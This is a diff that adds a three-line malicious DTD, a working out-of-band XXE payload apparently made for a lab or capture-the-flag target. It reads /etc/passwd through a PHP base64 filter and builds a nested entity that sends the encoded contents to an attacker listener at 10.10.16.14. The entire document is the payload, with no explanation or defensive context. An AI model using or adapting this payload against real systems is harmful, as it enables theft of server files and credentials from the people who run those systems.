@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+
+<!ENTITY % init "<!ENTITY &#x25; trick SYSTEM 'http://10.10.16.14:80/?p=%file;'>" >
